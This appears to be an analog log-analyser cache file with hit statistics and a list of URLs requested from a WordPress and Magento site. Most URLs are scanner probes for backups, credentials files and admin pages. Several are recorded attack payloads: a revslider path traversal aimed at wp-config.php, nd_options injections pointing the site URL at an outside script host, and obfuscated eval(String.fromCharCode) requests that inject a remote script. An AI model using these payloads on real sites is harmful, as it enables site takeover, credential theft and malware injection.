CACHE type 5 produced by analog 6.0/Unix. Do not modify or delete!
T	0	0	899	857	0	1001	4238658
D	25978675	26359429
18040	215	2	1	34009
18040	228	1	1	97
18040	239	1	0	33912
18041	89	1	1	97
18041	103	1	0	33912
18041	168	1	0	33912
18042	1	1	1	97
18042	23	1	1	97
18042	30	1	1	97
18042	127	1	1	97
18043	141	1	1	97
18044	48	1	1	97
18044	107	1	1	97
18044	140	1	0	33912
18044	173	1	0	33912
18044	241	1	0	33912
18045	4	1	0	33912
18045	105	1	0	33912
18045	132	1	1	630
18046	115	1	1	630
18047	130	1	1	376
18048	139	1	1	376
18049	116	1	1	376
18050	107	1	1	376
18050	128	1	1	376
18051	138	1	1	376
18052	135	2	2	752
18053	137	1	1	376
18054	116	1	1	376
18055	125	1	1	376
18055	129	1	1	376
18055	260	1	1	376
18056	3	1	1	376
18056	142	1	1	376
18057	105	1	1	376
18058	118	1	1	376
18059	141	1	1	376
18060	93	1	1	0
18060	104	1	1	376
18061	155	1	1	376
18062	119	1	1	376
18063	98	1	1	376
18063	137	1	1	376
18064	20	1	1	376
18064	50	1	1	376
18064	84	1	1	376
18064	137	1	1	376
18065	158	1	1	376
18066	85	1	1	376
18066	122	1	1	376
18066	124	2	2	752
18067	118	1	1	376
18067	164	2	2	752
18067	212	1	1	0
18068	3	1	1	376
18068	134	1	1	376
18069	137	1	1	376
18069	139	1	1	376
18070	98	1	1	376
18070	126	1	1	376
18071	112	1	1	376
18071	118	1	1	376
18072	107	1	1	376
18072	149	1	1	376
18073	128	2	2	752
18074	99	1	1	376
18074	125	1	1	376
18074	203	1	1	0
18075	127	1	1	376
18076	159	1	1	376
18076	205	7	7	2632
18077	64	1	1	376
18077	99	1	1	376
18077	103	1	1	376
18077	155	1	1	376
18078	162	1	1	376
18079	142	1	1	376
18079	233	2	2	752
18080	151	1	1	376
18080	260	2	2	752
18081	117	1	1	376
18081	125	1	1	376
18081	168	1	1	376
18082	50	2	2	752
18082	62	1	1	0
18082	152	2	2	752
18083	68	5	5	1880
18083	162	1	1	376
18084	26	1	1	376
18084	73	1	1	376
18084	79	1	1	376
18084	180	1	1	376
18084	195	1	1	376
18085	108	1	1	376
18085	167	1	1	376
18086	135	1	1	376
18086	145	1	1	376
18087	147	2	2	752
18088	183	1	1	376
18089	84	1	1	0
18089	157	1	1	376
18089	192	1	1	376
18089	271	1	1	376
18090	141	1	1	376
18090	158	1	1	376
18091	30	1	1	376
18091	38	1	1	376
18091	43	1	1	376
18091	107	1	1	376
18091	158	1	1	376
18092	151	1	1	376
18093	144	1	1	376
18093	218	1	1	376
18093	267	1	1	376
18094	125	1	1	376
18094	163	1	1	376
18095	111	1	1	376
18095	168	1	1	376
18096	25	1	1	0
18096	50	2	2	752
18096	140	1	1	376
18097	117	1	1	376
18097	161	1	1	376
18098	29	1	1	376
18098	35	1	1	376
18098	45	1	1	376
18098	116	1	1	376
18098	155	1	1	376
18099	102	1	1	376
18099	154	1	1	376
18100	112	1	1	376
18100	162	1	1	376
18101	62	2	2	752
18101	147	1	1	376
18101	161	1	1	376
18102	135	1	1	376
18103	71	1	1	0
18103	195	1	1	376
18104	106	1	1	376
18104	143	1	1	376
18104	194	1	1	376
18105	26	1	1	376
18105	32	1	1	376
18105	36	1	1	376
18105	52	1	1	376
18105	106	1	1	376
18105	140	1	1	376
18105	176	1	1	376
18105	230	1	1	376
18106	17	1	1	376
18106	139	1	1	376
18107	133	1	1	376
18107	140	1	1	376
18108	35	1	1	376
18108	106	1	1	376
18109	34	1	1	0
18109	93	1	1	376
18109	135	2	2	752
18110	50	2	2	752
18110	95	1	1	376
18110	96	1	1	376
18110	99	2	2	752
18110	123	1	1	376
18111	50	1	1	376
18111	180	1	1	376
18111	263	1	1	376
18112	26	1	1	376
18112	42	1	1	376
18112	105	1	1	376
18112	164	1	1	0
18112	172	1	1	376
18112	196	1	1	376
18113	14	1	1	376
18113	85	1	1	376
18113	181	1	1	376
18113	241	1	0	33912
18114	51	1	1	511
18114	172	1	1	511
18114	209	1	1	511
18115	99	1	1	511
18115	189	1	1	511
18116	44	1	1	511
18116	202	1	1	511
18116	205	1	1	0
18116	221	1	1	511
18117	136	1	1	511
18117	221	1	1	511
18118	113	1	1	511
18118	197	1	1	511
18118	211	1	1	511
18119	8	1	1	511
18119	51	1	1	511
18119	76	1	1	511
18119	105	1	1	511
18119	128	1	1	511
18119	161	1	1	511
18120	110	1	1	511
18120	170	1	1	511
18120	228	1	1	511
18121	138	1	1	511
18121	162	1	1	511
18122	106	1	1	511
18122	114	1	1	511
18122	275	1	1	511
18123	13	1	1	511
18123	38	1	1	511
18123	75	1	1	511
18123	140	1	1	511
18124	28	1	1	511
18124	50	2	2	1022
18124	182	1	1	511
18124	272	1	1	511
18125	63	1	1	511
18125	88	1	1	511
18125	234	1	1	511
18125	242	1	1	511
18126	30	1	1	511
18126	45	1	1	511
18126	128	1	1	511
18126	211	1	1	511
18127	3	1	1	511
18127	107	1	1	511
18127	180	1	1	511
18128	129	1	1	511
18128	163	1	1	511
18128	228	1	1	511
18129	160	1	1	511
18129	166	1	1	511
18130	127	1	1	511
18130	161	1	1	511
18131	196	1	1	511
18132	82	1	1	511
18132	84	1	1	0
18132	128	1	1	511
18132	137	1	1	511
18132	145	1	1	511
18132	165	1	1	511
18133	2	1	1	511
18133	29	1	1	511
18133	55	1	1	511
18133	77	1	1	511
18133	93	1	1	511
18133	170	1	1	511
18134	159	1	1	511
18135	134	1	1	511
18135	167	1	1	511
18135	242	1	1	511
18136	128	1	1	511
18136	158	1	1	511
18136	164	1	1	511
18137	152	1	1	511
18137	268	1	1	511
18138	9	1	1	511
18138	50	2	2	1022
18138	73	1	1	0
18138	105	1	1	511
18138	158	1	1	511
18139	158	1	1	511
18139	202	1	1	511
18139	207	1	1	511
18140	30	1	1	511
18140	40	1	1	511
18140	56	1	1	511
18140	166	1	1	511
18141	62	1	1	511
18141	174	1	1	511
18142	235	1	1	511
18143	98	1	1	511
18144	191	1	1	511
18144	227	1	1	511
18145	40	1	1	511
18145	42	1	1	511
18146	168	1	1	511
18146	238	1	1	511
18147	24	1	1	511
18147	118	1	1	511
18147	177	1	1	511
18147	184	1	1	511
18147	283	1	1	511
18148	125	1	1	0
18148	176	1	1	511
18149	176	1	1	511
18149	272	1	1	511
18150	2	1	1	511
18150	22	1	1	511
18150	183	1	1	511
18151	176	1	1	511
18152	50	2	2	1022
18152	66	1	1	511
18152	137	1	1	511
18153	19	1	1	511
18153	159	1	1	511
18153	267	1	1	511
18154	1	1	1	511
18154	17	1	1	511
18154	128	1	1	511
18155	34	1	1	0
18155	152	1	1	511
18156	136	1	1	511
18157	69	1	1	511
18158	6	1	1	511
18158	192	1	1	511
18158	242	1	1	511
18159	51	1	1	511
18159	246	1	1	511
18160	49	1	1	511
18160	66	1	1	511
18160	252	1	1	511
18160	277	1	1	511
18161	17	1	1	511
18161	22	1	1	511
18161	69	1	1	511
18161	217	1	1	511
18162	276	1	1	511
18163	206	1	1	511
18163	225	1	1	511
18164	153	1	1	511
18164	155	1	1	511
18164	236	1	1	511
18165	55	1	1	511
18165	178	1	1	511
18166	25	1	1	511
18166	50	2	2	1022
18166	240	1	1	511
18166	281	1	1	0
18167	50	1	1	511
18168	19	1	1	511
18168	25	1	1	511
18168	72	1	1	511
18168	77	1	1	0
18168	102	1	1	511
18170	47	1	1	511
18170	115	1	1	511
18171	57	1	1	511
18171	66	1	1	511
18171	67	1	1	511
18171	68	4	4	2044
18171	69	3	3	1533
18171	70	2	2	1022
18171	120	1	1	511
18172	90	1	1	511
18174	72	1	1	511
18174	74	1	1	511
18174	79	1	1	511
18174	181	1	1	511
18174	190	1	1	511
18174	250	2	2	1022
18175	16	1	1	511
18175	30	1	1	511
18175	73	1	1	511
18175	94	2	2	1022
18175	142	1	1	511
18176	6	1	1	511
18176	174	1	1	511
18177	176	1	1	511
18177	180	1	1	511
18178	29	1	1	511
18178	54	1	1	511
18178	124	1	1	0
18178	181	1	1	511
18178	182	1	1	511
18178	239	1	1	511
18178	240	1	1	511
18179	186	1	1	511
18180	73	1	1	511
18180	182	1	1	511
18180	268	2	2	1022
18181	74	2	2	1022
18181	80	1	1	511
18181	82	1	1	511
18181	86	2	2	1022
18181	92	1	1	511
18181	93	1	1	511
18181	98	1	1	511
18181	99	1	1	511
18181	104	2	2	1022
18181	108	1	1	511
18181	110	1	1	511
18181	111	2	2	1022
18181	122	1	1	511
18181	123	1	1	511
18181	134	2	2	1022
18181	140	1	1	511
18181	141	1	1	511
18181	146	2	2	1022
18181	152	2	2	1022
18181	158	2	2	1022
18181	164	2	2	1022
18181	178	1	1	511
18182	24	1	1	511
18182	39	1	1	511
18182	75	1	1	511
18182	114	1	1	511
18182	131	1	1	0
18182	137	1	1	511
18182	171	1	1	511
18183	174	1	1	511
18184	51	5	5	2555
18184	52	1	1	511
18184	53	3	3	1533
18184	105	1	1	511
18184	172	1	1	511
18185	91	1	1	511
18185	112	1	1	511
18185	115	1	1	511
18185	148	1	1	511
18186	176	1	1	511
18187	112	1	1	511
18187	167	1	1	511
18188	118	1	1	511
18188	173	1	1	511
18189	20	1	1	511
18189	100	1	1	511
18189	108	1	1	511
18189	168	1	1	511
18190	172	1	1	511
18191	124	1	1	511
18191	153	1	1	511
18191	159	1	1	0
18191	285	1	1	511
18192	178	1	1	511
18193	177	1	1	511
18194	167	1	1	511
18194	235	1	1	511
18195	72	1	1	511
18195	176	1	1	511
18196	19	1	1	511
18196	26	1	1	511
18196	37	1	1	511
18196	154	1	1	511
18196	232	1	1	0
18197	170	1	1	511
18198	175	1	1	511
18199	155	1	1	511
18199	236	1	1	511
18200	115	1	1	511
18200	161	1	1	511
18201	75	1	1	511
18201	201	1	1	511
18202	140	1	1	511
18203	7	2	2	1022
18203	33	1	1	511
18203	38	1	1	511
18203	49	1	1	511
18203	156	1	1	511
18204	63	1	1	511
18204	122	3	3	1533
18204	184	1	1	511
18204	187	1	1	511
18205	112	1	1	511
18206	138	1	1	511
18207	65	1	1	511
18208	167	1	1	511
18208	264	1	1	0
18209	137	1	1	511
18209	152	2	2	1022
18210	7	1	1	511
18210	25	1	1	511
18210	130	1	1	39909
18210	132	1	1	511
18210	134	1	1	39897
18210	141	2	2	1022
18210	142	1	1	0
18210	225	1	1	0
18211	28	1	1	511
18211	99	1	1	511
18212	115	1	1	511
18212	116	1	1	511
18212	147	1	1	0
18212	284	1	1	511
18213	76	1	1	511
18213	77	1	1	511
18213	95	1	1	511
18213	97	1	1	511
18213	139	1	1	0
18214	35	1	1	511
18214	40	1	1	39897
18214	45	1	1	39909
18214	47	1	1	511
18214	49	1	1	511
18214	71	1	1	511
18215	67	1	1	511
18215	146	1	1	511
18215	255	2	2	1022
18216	55	1	1	511
18216	69	1	1	511
18216	217	1	1	0
18217	13	1	1	511
18217	24	1	1	511
18217	36	1	1	511
18217	49	1	1	511
18217	110	1	1	511
18218	61	1	1	511
18218	187	1	1	511
18218	188	1	1	511
18218	216	1	1	0
18219	66	1	1	511
18220	18	1	1	511
18220	58	1	1	511
18220	112	1	1	511
18220	227	1	1	0
18221	75	1	1	511
18222	62	1	1	511
18222	273	1	1	0
18223	29	1	1	511
18223	75	1	1	511
18224	26	1	1	511
18224	28	1	1	511
18224	40	1	1	511
18224	58	1	1	511
18225	101	1	1	511
18227	135	1	1	511
18227	214	1	1	0
18228	104	1	1	511
18228	119	1	1	511
18229	50	2	2	1022
18229	71	1	1	0
18229	123	1	1	511
18230	93	1	1	0
18231	23	1	1	511
18231	37	1	1	511
18231	59	1	1	511
18231	61	1	1	511
18231	145	1	1	0
18231	240	1	0	12078
18231	242	1	1	511
18232	155	1	1	0
18233	153	1	1	0
18234	123	1	1	0
18234	233	1	1	511
18234	254	1	1	39909
18235	155	1	1	0
18235	234	1	1	511
18236	37	1	1	39897
18236	38	1	1	39909
18236	45	1	1	511
18236	46	1	1	511
18236	48	1	1	511
18236	101	1	1	0
18236	150	1	1	0
18237	150	1	1	0
18237	152	2	2	1022
18238	25	1	1	511
18238	27	1	1	511
18238	33	1	1	511
18238	42	1	1	511
18238	141	1	1	0
18239	122	1	1	0
18240	152	1	1	0
18241	61	1	1	511
18241	95	1	1	511
18242	146	1	1	0
18243	48	15	10	598931
18243	106	1	1	0
18244	114	1	1	0
18245	2	1	1	511
18245	14	1	1	511
18245	36	1	1	511
18245	124	1	1	0
18246	128	1	1	0
18247	194	15	10	599111
18247	275	1	1	511
18248	231	9	9	359620
18248	233	5	0	199818
18248	234	11	1	402574
18249	78	1	0	12081
18249	118	1	0	12085
18250	25	9	9	359512
18250	111	1	1	0
18250	179	1	1	511
18250	247	2	2	1022
18251	56	5	5	2555
18251	57	22	22	11242
18251	58	30	30	15330
18251	59	6	6	3066
18251	121	1	1	0
18252	12	2	2	1022
18252	41	1	1	511
18252	43	1	1	511
18252	47	1	1	511
18252	107	1	1	0
18254	46	1	1	0
18254	101	1	1	0
18254	267	1	1	511
18255	35	1	1	511
18255	94	1	1	12080
18255	120	1	1	0
18255	122	1	1	12077
18255	180	1	1	511
18255	282	1	1	511
18256	132	1	1	0
18257	119	1	1	0
18257	179	2	2	0
18258	148	1	1	0
18259	14	1	1	511
18259	20	1	1	511
18259	115	1	1	0
18259	176	1	1	511
18260	91	1	1	511
18261	101	1	1	511
18261	169	1	1	0
18261	262	1	1	511
18262	112	1	1	0
18262	122	1	1	39897
18262	261	1	0	12078
18262	264	1	1	39909
18263	118	1	1	0
18263	133	1	0	12089
18264	124	1	1	0
18264	185	1	1	525
18265	120	1	1	0
18265	279	1	1	780
18266	31	1	1	780
18266	119	1	1	780
18266	122	1	1	0
18267	128	1	1	0
18268	121	1	1	0
18268	200	1	1	780
18268	202	1	1	780
18268	203	1	1	39897
18268	222	1	1	780
18268	226	1	1	780
18268	227	1	1	39909
18268	230	1	1	0
18269	108	1	1	0
18270	186	1	1	0
18271	113	1	1	0
18271	238	2	2	1560
18272	69	1	1	780
18272	241	1	1	0
18273	69	1	1	780
18274	73	1	1	780
18274	115	1	1	0
18274	277	1	1	780
18275	117	1	1	0
18275	191	1	1	780
18276	11	1	1	780
18276	13	1	1	780
18276	99	1	1	780
18276	116	1	1	0
18278	185	1	1	0
18278	212	1	1	780
18279	135	1	1	39897
18279	174	1	1	780
18279	207	1	1	0
18279	222	1	0	12072
18280	11	1	1	780
18280	41	1	1	780
18280	130	1	1	0
18289	169	1	1	0
18290	80	1	1	39897
18290	114	1	1	938
18290	196	1	1	938
18290	236	4	4	3752
18291	1	1	1	938
18291	185	1	1	0
18292	18	1	1	39897
18292	73	1	1	39909
18292	131	1	1	0
18292	196	1	1	938
18293	18	1	1	938
18293	166	1	1	0
18293	176	1	1	39897
18293	206	1	1	938
18294	4	1	1	938
18294	13	1	1	938
18294	16	1	1	938
18294	142	1	1	0
18295	167	1	1	0
18296	44	1	1	938
18296	45	1	1	39909
18296	52	1	1	938
18296	55	1	1	39897
18296	57	1	1	938
18296	75	1	1	938
18297	54	1	1	39897
18297	62	1	1	938
18297	99	1	1	938
18297	153	1	1	0
18297	195	1	1	938
18298	5	1	1	938
18298	53	1	1	938
18298	160	1	1	0
18299	4	1	1	0
18299	152	1	1	0
18299	184	1	1	938
18299	238	2	2	1876
18299	244	2	2	1876
18299	260	1	1	938
18299	266	1	0	12086
18300	4	1	1	938
18300	19	1	1	39897
18300	136	1	1	0
18300	214	1	1	938
18300	219	1	1	39897
18300	222	1	1	39909
18300	225	1	1	938
18300	226	1	1	938
18301	150	1	1	0
18302	104	2	2	1876
18302	119	1	1	938
18302	134	1	1	0
18303	49	1	1	938
18303	142	1	1	0
18303	162	1	1	938
18303	168	1	1	938
18304	24	1	1	938
18304	153	1	1	0
18305	5	1	1	938
18305	41	1	1	39897
18305	45	1	1	938
1	0	0	0	1	0	0	26343223	0	0	26343223	0	/database/print.css
1	0	0	0	51	0	0	26185225	0	0	26030469	0	/wp-admin/admin-post.php
1	0	0	0	3	0	0	26185218	0	0	26136112	0	/wp-admin/admin-ajax.php?page=wppcp-settings
1	0	0	0	1	0	0	26055255	0	0	26055255	0	/master.zip
1	0	0	0	3	0	0	26280128	0	0	26278279	0	/old/rss/catalog/notifystock
1	0	0	0	3	0	0	26280128	0	0	26278279	0	/rss/order/new
1	0	0	0	1	0	0	26270597	0	0	26270597	0	/.remote-sync.json
1	0	0	0	2	0	0	26278764	0	0	26014499	0	/shop/errors/503.php
1	0	0	0	1	0	0	26055255	0	0	26055255	0	/master.tar.gz
1	0	0	0	1	0	0	26055255	0	0	26055255	0	/wp.zip
1	0	0	0	2	0	0	26110808	0	0	26055255	0	/wp-content/plugins/wp-live-chat-support/css/wplcstyle.css
1	0	0	0	1	0	0	26171811	0	0	26171811	0	/wp-content/plugins/wp-shopify/dist/public.min.css
1	0	0	0	2	0	0	26072082	0	0	26071332	0	/wp-content/plugins/pirate-forms/public/js/custom-spam.js
1	0	0	0	3	0	0	26280128	0	0	26278281	0	/shop/rss/order/new
1	0	0	0	1	0	0	26270597	0	0	26270597	0	/sftp-config.json
1	0	0	0	1	0	0	26278764	0	0	26278764	0	/store/rss/order/new
1	0	0	0	1	0	0	26278764	0	0	26278764	0	/magento/rss/order/new
1	0	0	0	2	0	0	26278764	0	0	26278279	0	/test/rss/catalog/notifystock
1	0	0	0	1	0	0	26110810	0	0	26110810	0	/wp-content/plugins/wp-piwik/js/wp-piwik.js
1	0	0	0	1	0	0	26055255	0	0	26055255	0	/wp-content/plugins/limb-gallery/js/grsFrontend.min.js
1	0	0	0	2	0	0	26185222	0	0	26166591	0	/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
1	0	0	0	1	0	0	26171811	0	0	26171811	0	/wp-content/plugins/wpshopify/dist/public.min.css
1	0	0	0	4	0	0	26185216	0	0	26185216	0	/wp-json/visualizer/v1/update-chart
1	0	0	0	1	0	0	25982610	0	0	25982610	0	/robots.txt?34.211.146.171
1	0	0	0	1	0	0	26278764	0	0	26278764	0	/demo/rss/catalog/notifystock
1	0	0	0	3	0	0	26185222	0	0	26131343	0	/wp-config.php?aam-media=1
1	0	0	0	1	0	0	26110809	0	0	26110809	0	/wp-content/plugins/yellow-pencil-visual-theme-customizer/js/yellow-pencil.js
1	0	0	0	28	0	0	26348150	0	0	26106305	0	/robots.txt?38.145.113.85
1	1	1	0	0	25979487	0	0	25979487	0	0	97	/?66.133.109.36
1	0	0	0	1	0	0	26055255	0	0	26055255	0	/archive.tar.gz
1	0	0	0	9	0	0	26357602	0	0	26226419	0	/.well-known/assetlinks.json
1	3	3	0	0	26185215	0	0	26180543	0	0	1533	/?ithemes-sync-request=1
1	0	0	0	1	0	0	26166583	0	0	26166583	0	/wp-admin/admin-post.php?nd_options_value_import_settings=siteurl[nd_options_option_value]https://glass.belaterbewasthere.com/first//pret.js?l=1&[nd_options_end_option]
1	2	2	0	1	26280128	0	26278763	26278279	0	26278763	79904	/test/index.php/admin/
1	0	0	0	3	0	0	26166575	0	0	26110807	0	/3
1	0	0	0	1	0	0	26055255	0	0	26055255	0	/.well-known.gz
1	0	0	0	3	0	0	26166575	0	0	26110806	0	/2
1	2	2	0	2	26276651	0	26276726	26270164	0	26259571	79872	/magento/admin/
1	0	0	0	1	0	0	26343223	0	0	26343223	0	/phpMyAdmin/print.css
1	0	0	0	2	0	0	26097188	0	0	26093943	0	/1
1	0	0	0	2	0	0	26172473	0	0	26172472	0	/cart/
1	23	23	0	0	26063071	0	0	26001354	0	0	7896	/?34.208.155.83
1	1	1	0	2	26270164	0	26276726	26270164	0	26259570	39912	/admin/
1	0	0	0	1	0	0	26000656	0	0	26000656	0	/fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media
1	0	0	0	4	0	0	26142083	0	0	26079411	0	/.env
1	0	0	0	1	0	0	26171812	0	0	26171812	0	/wp-content/plugins/simple-fields/js/chosen/chosen.css
1	0	0	0	1	0	0	26171811	0	0	26171811	0	/wp-content/plugins/wpematico/app/js/wpe_hooks.js
1	0	0	0	116	0	0	26185225	0	0	26011131	0	/wp-admin/admin-ajax.php
1	0	0	0	2	0	0	26055255	0	0	26055255	0	/InCreate-FullPackage.tar.gz
1	0	0	0	3	0	0	26084849	0	0	26067494	0	/robots.txt?66.249.75.3
1	0	0	0	3	0	0	26166573	0	0	26030469	0	/wp-admin/admin-ajax.php?action=wcp_change_post_width
1	0	0	0	3	0	0	26280128	0	0	26278279	0	/dev/rss/catalog/review
1	0	0	0	1	0	0	26166584	0	0	26166584	0	/wp-admin/admin-ajax.php?nd_options_value_import_settings=home[nd_options_option_value]https://glass.belaterbewasthere.com/first//pret?l=1&[nd_options_end_option]
1	0	0	0	2	0	0	26055255	0	0	26055255	0	/InCreate-FullPackage.zip
1	0	0	0	1	0	0	26171812	0	0	26171812	0	/wp-content/plugins/insta-gallery/assets/insta-gallery-min.css
1	0	0	0	1	0	0	26162307	0	0	26162307	0	/vb/
1	2	0	0	2	26278293	0	26278764	26278293	0	26014498	79908	/store/errors/503.php
1	0	0	0	1	0	0	26208561	0	0	26208561	0	/_adminer.php
1	1	0	0	0	26278953	0	0	26278953	0	0	12081	/wp-login.php?38.145.113.85
1	1	1	0	0	25981118	0	0	25981118	0	0	97	/?45.63.15.169
1	0	0	0	5	0	0	26280129	0	0	26278279	0	/demo/rss/order/new
1	0	0	0	1	0	0	26185217	0	0	26185217	0	/wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=eval(String.fromCharCode(32,40,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,118,97,114,32,101,108,101,109,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,10,9,101,108,101,109,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,10,32,32,32,32,101,108,101,109,46,115,114,99,32,61,32,39,104,116,116,112,115,58,47,47,99,100,46,112,114,105,118,97,99,121,108,111,99,97,116,105,111,110,102,111,114,108,111,99,46,99,111,109,47,99,111,114,110,47,102,108,101,120,46,106,115,63,116,112,61,52,39,59,10,32,32,32,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,34,104,101,97,100,34,41,91,48,93,46,97,112,112,101,110,100,67,104,105,108,100,40,101,108,101,109,41,59,10,32,32,125,41,40,41,59));
1	0	0	0	1	0	0	26185218	0	0	26185218	0	/wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email=eval(String.fromCharCode(32,40,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,118,97,114,32,101,108,101,109,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,10,9,101,108,101,109,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,10,32,32,32,32,101,108,101,109,46,115,114,99,32,61,32,39,104,116,116,112,115,58,47,47,99,100,46,112,114,105,118,97,99,121,108,111,99,97,116,105,111,110,102,111,114,108,111,99,46,99,111,109,47,99,111,114,110,47,102,108,101,120,46,106,115,63,116,112,61,52,39,59,10,32,32,32,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,34,104,101,97,100,34,41,91,48,93,46,97,112,112,101,110,100,67,104,105,108,100,40,101,108,101,109,41,59,10,32,32,125,41,40,41,59));
1	0	0	0	1	0	0	26110810	0	0	26110810	0	/wp-content/plugins/smart-google-code-inserter/screenshot1.jpg
1	0	0	0	2	0	0	26278764	0	0	26278286	0	/magento/rss/catalog/review
1	0	0	0	1	0	0	26171811	0	0	26171811	0	/wp-content/plugins/rich-reviews/css/rich-reviews.css
1	0	0	0	3	0	0	26185216	0	0	26158493	0	/wp-admin/admin-post.php?page=fp_admin_options_page
1	0	0	0	2	0	0	26072082	0	0	26071332	0	/wp-content/plugins/onesignal-free-web-push-notifications/sdk_files/manifest.json.php
1	0	0	0	1	0	0	26055256	0	0	26055256	0	/wp-admin/admin-ajax.php?page=wpim_manage_settings
1	0	0	0	1	0	0	26343223	0	0	26343223	0	/pma/print.css
1	2	2	0	4	26276651	0	26276726	26270164	0	26172472	79832	/shop/
1	0	0	0	1	0	0	26278764	0	0	26278764	0	/demo/downloader/index.php
1	0	0	0	15	0	0	26185223	0	0	26030469	0	/wp-admin/admin-post.php?yp_remote_get=test
1	0	0	0	2	0	0	26055255	0	0	26055255	0	/installer.gz
1	0	0	0	2	0	0	26278764	0	0	26014499	0	/magento/errors/503.php
1	2	2	0	1	26280128	0	26278763	26278279	0	26278763	79900	/dev/index.php/admin/
1	0	0	0	1	0	0	26017937	0	0	26017937	0	/public_html.gz
1	1	1	0	0	26185218	0	0	26185218	0	0	511	/?export_settings=l
1	0	0	0	2	0	0	26055255	0	0	26055255	0	/archive.gz
1	18	18	0	0	26064562	0	0	26017072	0	0	6768	/?199.229.249.169
1	1	0	0	2	26278290	0	26278764	26278290	0	26014499	39970	/magento/downloader/index.php
1	0	0	0	1	0	0	26270597	0	0	26270597	0	/.vscode/sftp.json
1	0	0	0	1	0	0	26270597	0	0	26270597	0	/.vscode/ftp-sync.json
1	0	0	0	1	0	0	26208561	0	0	26208561	0	/ad.php
1	0	0	0	1	0	0	26166583	0	0	26166583	0	/wp-admin/admin-ajax.php?nd_options_value_import_settings=siteurl[nd_options_option_value]https://glass.belaterbewasthere.com/first//pret.js?l=1&[nd_options_end_option]
1	2	0	0	2	26276651	0	26276726	26270164	0	26259571	79912	/shop/pub/errors/503.php
1	1	0	0	1	26278292	0	26278764	26278292	0	26278764	39950	/old/errors/503.php
1	0	0	0	2	0	0	26278764	0	0	26278281	0	/demo/rss/catalog/review
1	0	0	0	1	0	0	26270597	0	0	26270597	0	/.ftpconfig
1	0	0	0	1	0	0	26208562	0	0	26208562	0	/Adminer.php
1	0	0	0	1	0	0	26185222	0	0	26185222	0	/wp-content/uploads/file-manager/log.txt
1	0	0	0	1	0	0	26185218	0	0	26185218	0	/wp-admin/admin-post.php?page=br-aapf-setup&step=wizard_selectors
1	0	0	0	4	0	0	26115521	0	0	26030469	0	/join
1	1	0	0	2	26278289	0	26278764	26278289	0	26014498	39966	/store/downloader/index.php
1	0	0	0	1	0	0	26185217	0	0	26185217	0	/wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&token=eval(String.fromCharCode(32,40,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,118,97,114,32,101,108,101,109,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,10,9,101,108,101,109,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,10,32,32,32,32,101,108,101,109,46,115,114,99,32,61,32,39,104,116,116,112,115,58,47,47,99,100,46,112,114,105,118,97,99,121,108,111,99,97,116,105,111,110,102,111,114,108,111,99,46,99,111,109,47,99,111,114,110,47,102,108,101,120,46,106,115,63,116,112,61,52,39,59,10,32,32,32,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,34,104,101,97,100,34,41,91,48,93,46,97,112,112,101,110,100,67,104,105,108,100,40,101,108,101,109,41,59,10,32,32,125,41,40,41,59));
1	0	0	0	1	0	0	26185222	0	0	26185222	0	/wp-admin/admin-ajax.php?action=import_csv
1	0	0	0	1	0	0	26162307	0	0	26162307	0	/vb5/
1	0	0	0	2	0	0	26278764	0	0	26278279	0	/test/rss/order/new
1	2	2	0	1	26280128	0	26278763	26278279	0	26278763	79900	/old/index.php/admin/
1	0	0	0	1	0	0	26208560	0	0	26208560	0	/adm.php
1	0	0	0	1	0	0	26171811	0	0	26171811	0	/wp-content/plugins/wp-database-backup/assets/js/jquery.dataTables.js
1	0	0	0	1	0	0	26171812	0	0	26171812	0	/wp-content/plugins/easy2map/scripts/jquery.xml2json.js
1	0	0	0	1	0	0	26158494	0	0	26158494	0	/wp-json/wp/v2/posts
1	0	0	0	1	0	0	26166584	0	0	26166584	0	/wp-admin/admin-post.php?nd_options_value_import_settings=home[nd_options_option_value]https://glass.belaterbewasthere.com/first//pret?l=1&[nd_options_end_option]
1	0	0	0	1	0	0	26208560	0	0	26208560	0	/adminer.php?38.145.113.85
1	0	0	0	2	0	0	26110809	0	0	26055255	0	/wp-content/plugins/responsive-coming-soon/templates/template1/assets/css/style.css
1	0	0	0	1	0	0	26055255	0	0	26055255	0	/master.gz
1	1	0	0	1	26278290	0	26278764	26278290	0	26278764	39970	/staging/downloader/index.php
1	1	1	0	0	26226704	0	0	26226704	0	0	511	/?id=24161
1	0	0	0	4	0	0	26055255	0	0	26055255	0	/InCreate-FullPackage.gz
1	0	0	0	1	0	0	26171811	0	0	26171811	0	/wp-content/plugins/wp-slimstat/wp-slimstat.min.js
1	2	2	0	2	26276651	0	26276726	26270164	0	26259571	79876	/magento2/admin/
1	0	0	0	4	0	0	26185216	0	0	26055256	0	/wp-admin/admin-post.php?page=wpim_manage_settings
1	0	0	0	1	0	0	26162307	0	0	26162307	0	/vbulletin/
1	0	0	0	1	0	0	26278764	0	0	26278764	0	/store/rss/catalog/notifystock
1	0	0	0	4	0	0	26171812	0	0	26092516	0	/wp-content/plugins/simple-301-redirects-addon-bulk-uploader/assets/css/notices.css
1	3	3	0	0	26018592	0	0	26012848	0	0	1128	/?54.186.244.230
